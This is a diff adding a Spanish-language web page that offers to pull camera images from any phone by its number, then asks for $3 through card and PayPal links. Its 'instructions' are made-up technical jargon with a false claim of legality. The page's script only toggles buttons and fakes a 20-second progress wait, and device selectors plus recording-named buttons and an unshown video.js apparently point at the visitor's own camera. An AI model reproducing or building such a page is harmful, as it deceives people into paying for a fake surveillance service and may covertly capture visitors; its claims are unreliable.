@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="icon" type="image/x-icon" href="favicon.png">
+    <link rel="stylesheet" type="text/css" href="estilo.css">
+    <title>Wirdsoft | Media Project</title>
+    <script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+</head>
+<body>
+		<h2 id="estado" class="estado">
+		<h1></h1>
+        <label for="dispositivosDeAudio"></label>
+        <select name="dispositivosDeAudio" id="dispositivosDeAudio"></select>
+        <label for="dispositivosDeVideo">Cámara:</label>
+        <select name="dispositivosDeVideo" id="dispositivosDeVideo"></select>
+        <img class="imagen" src="imagenes/logotipo.png">
+        <h2 class="subt">Puedes obtener imágenes tomadas con la cámara del dispositivo asociado al número de teléfono que se ingrese.</h2>
+        <div class="funcion">
+			<a onclick="return blmostrocult(this);"><button class="mfuncion"><strong>Instrucciones</strong></button></a><div class="instrucciones" style="display: none;color: white;text-shadow: 3px 2px 6px transparent;">Nuestra aplicación funciona gracias a una API, basada en un sistema de algoritmos de automatización, que se encargan del transporte inverso de datos pictográficos encontrados en la cache de el dispositivo, obteniendo de esta manera, las peticiones de nuestro servidor, a través de los accesos concedidos por el usuario, para interactuar por medio de url's enlazadas con destino a la petición establecida por el remitente.<br><br><strong>Modo de uso:</strong><br><br><li>Ingrese el número de teléfono de la persona que desee obtener las imágenes.</li><br><li>Presione el botón de 'Enviar' y espere hasta que el proceso termine.</li><br>Cuando el proceso se haya completado, se habilitará el botón 'Continuar', el cual lo redirige al enlace con las imágenes obtenidas.</br><h5>El uso de esta aplicación NO es ilegal, ya que al recibir el enlace, el destinatario acepta nuestras <strong>políticas de servicio</strong></h5></div>
+		<div>
+        <p>
+        	<input type="text" name="numero" placeholder="  Número de teléfono:">
+        	<p>
+        		<button class="boton" id="btnComenzarGrabacion" style="visibility: visible; display: initial;" onclick="primero()"><img class="icono" src="imagenes/enviar.png">
+        			<h3 class="enviar"></h3>
+        		</button>
+        		<button id="primero" style="visibility:hidden; display:none;" onclick="segundo()">
+        			<img class="icono" src="imagenes/enviar.png">
+        			<h3 class="enviar"></h3>
+        		</button>
+
+        			<img class="iconoDos" src="imagenes/loading.gif" id="segundo" style="visibility:hidden; display:none;" onclick="">
+
+        		<button class="boton3" id="btnDetenerGrabacion" style="visibility: hidden; display: none;" onclick="tercero()"><strong>Continuar<strong></button>
+        		<button class="tres" id="tercero" style="visibility:hidden; display:none;" onclick="pagina()"><strong>Continuar</strong></button>
+        	</p>
+        </p>
+        <div class="texto">
+        	<p class="inf">Te otorgamos una prueba gratuita por primera vez, después solo costará $3 USD.<br>Necesitamos fondos para poder seguir prestando este servicio.</p>
+        </div>
+        <div class="pago">
+        	<a href="https://secure.checkout.visa.com/?country=CO&locale=es-CO"><img src="imagenes/visa.png" style="margin-right: 10px;margin-top: 10px;"></a><a href="https://online.americanexpress.com/myca/logon/us/action?request_type=LogonHandler&Face=en_US&DestPage=https%3A%2F%2Fonline.americanexpress.com%2Fmyca%2Facctsumm%2Fus%2Faction%3Frequest_type%3Dauthreg_acctAccountSummary%26entry_point%3Dlnk_homepage%26aexp_nav%3Dsc_checkbill%26referrer%3Dushome%26section%3Dlogin"><img src="imagenes/american.png" style="margin-right: 10px;margin-top: 10px;"></a><a href="https://www.paypal.com/co/signin"><img src="imagenes/paypal.png" style="margin-right: 10px;margin-top: 10px;"></a>
+        </div>
+        <video muted="muted" id="video"></video>
+        <p id="duracion"></p>
+        
+        
+    <script src="js/video.js"></script>
+
+    <script type='text/JavaScript'>
+	  function blmostrocult(blconted) {
+	  var c=blconted.nextSibling;
+	  if(c.style.display=='none') {
+	  c.style.display='block';
+	  } else {
+	  c.style.display='none';
+	  }
+	  return false;
+	  }
+	     function ini() {
+         document.getElementById('btnComenzarGrabacion').style.visibility='visible';
+         document.getElementById('btnComenzarGrabacion').style.display='initial';
+         document.getElementById('primero').style.visibility='hidden';
+         document.getElementById('primero').style.display='none';
+         document.getElementById('segundo').style.visibility='hidden';
+         document.getElementById('segundo').style.display='none';
+         document.getElementById('tercero').style.visibility='hidden';
+         document.getElementById('tercero').style.display='none';
+         document.getElementById('btnDetenerGrabacion').style.visibility='hidden';
+         document.getElementById('btnDetenerGrabacion').style.display='none';
+      };
+      function primero() {
+         document.getElementById('primero').style.visibility='visible';
+         document.getElementById('primero').style.display='initial';
+         document.getElementById('btnComenzarGrabacion').style.visibility='hidden';
+         document.getElementById('btnComenzarGrabacion').style.display='none';
+         document.getElementById('segundo').style.visibility='hidden';
+         document.getElementById('segundo').style.display='none';
+         document.getElementById('btnComenzarGrabacion').style.visibility='hidden';
+         document.getElementById('btnComenzarGrabacion').style.display='none';
+         document.getElementById('tercero').style.visibility='hidden';
+         document.getElementById('tercero').style.display='none';
+      };
+      function segundo() {
+      	 setTimeout(fin,20000)
+         document.getElementById('segundo').style.visibility='visible';
+         document.getElementById('segundo').style.display='initial';
+         document.getElementById('btnComenzarGrabacion').style.visibility='hidden';
+         document.getElementById('btnComenzarGrabacion').style.display='none';
+         document.getElementById('primero').style.visibility='hidden';
+         document.getElementById('primero').style.display='none';
+         document.getElementById('btnComenzarGrabacion').style.visibility='hidden';
+         document.getElementById('btnComenzarGrabacion').style.display='none';
+         document.getElementById('tercero').style.visibility='hidden';
+         document.getElementById('tercero').style.display='none';
+      };
+	     function fin() {
+         document.getElementById('btnDetenerGrabacion').style.visibility='visible';
+         document.getElementById('btnDetenerGrabacion').style.display='initial';
+         document.getElementById('primero').style.visibility='hidden';
+         document.getElementById('primero').style.display='none';
+         document.getElementById('segundo').style.visibility='hidden';
+         document.getElementById('segundo').style.display='none';
+         document.getElementById('tercero').style.visibility='hidden';
+         document.getElementById('tercero').style.display='none';
+         document.getElementById('btnComenzarGrabacion').style.visibility='hidden';
+         document.getElementById('btnComenzarGrabacion').style.display='none';
+      };
+      function tercero() {
+      	setTimeout(aparecer,1000);
+    	function aparecer()
+    	{
+         	document.getElementById('tercero').style.visibility='visible';
+         	document.getElementById('tercero').style.display='initial';	        
+	        document.getElementById('segundo').style.visibility='hidden';
+	        document.getElementById('segundo').style.display='none';
+	        document.getElementById('primero').style.visibility='hidden';
+	        document.getElementById('primero').style.display='none';
+	        document.getElementById('btnDetenerGrabacion').style.visibility='hidden';
+         	document.getElementById('btnDetenerGrabacion').style.display='none';
+	        document.getElementById('btnComenzarGrabacion').style.visibility='hidden';
+         	document.getElementById('btnComenzarGrabacion').style.display='none';
+	    }
+      };
+      function pagina() {
+      	window.location.replace("cargar.html")
+      }
+
+ </script>
+</body>
+<h1></h1>
+<footer>
+	<div class="piedepagina">
+		<a href="red.html" class="contacto">Contacto  ·  </a><a href="red.html" class="faq">Preguntas  ·  </a><a href="red.html" class="acerca">Más servicios</a>
+		<p class="fin">wirdsoft Team 2020</p><p class="copyright">Todos los derechos reservados.</p>
+	</div>
+	<div class="social">
+		<a href="https://facebook.com"><img src="imagenes/fac.png"></a>
+		<a href="https://twitter.com/"><img src="imagenes/twitter.png"></a>
+		<a href="https://www.instagram.com/"><img src="imagenes/instagram.png"></a>
+	</div>
+</footer>
+</html>
